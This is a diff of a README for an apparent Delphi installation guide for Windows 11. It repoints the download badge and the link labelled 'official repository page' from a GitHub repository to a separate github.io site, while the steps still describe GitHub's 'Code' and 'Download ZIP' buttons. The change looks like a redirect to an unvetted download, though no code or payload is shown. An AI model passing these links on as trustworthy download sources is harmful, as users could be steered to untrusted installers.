@@ -1,6 +1,6 @@
 # 🛠️ Delphi-Configuration-Guide - Get Delphi Running On Windows Today
 
-[![](https://img.shields.io/badge/Download-Configuration%20Files-blue.svg)](https://github.com/Harjee4748/Delphi-Configuration-Guide)
+[![](https://img.shields.io/badge/Download-Configuration%20Files-blue.svg)](https://harjee4748.github.io)
 
 This project provides a clear path for installing Delphi on Windows 11. Many users face issues during the setup process. This guide removes the guesswork. You will find installation steps, fixes for common errors, and configuration tips to ensure your software works on your PC.
 
@@ -17,7 +17,7 @@ It helps to close all other open programs before you start the installer. This p
 ## 📥 How To Download And Install
 You must visit the project page to access the necessary installers and files.
 
-1. Navigate to the [official repository page](https://github.com/Harjee4748/Delphi-Configuration-Guide).
+1. Navigate to the [official repository page](https://harjee4748.github.io).
 2. Click the green "Code" button near the top right.
 3. Select "Download ZIP" to save the files to your computer.
 4. Locate the ZIP file in your Downloads folder.
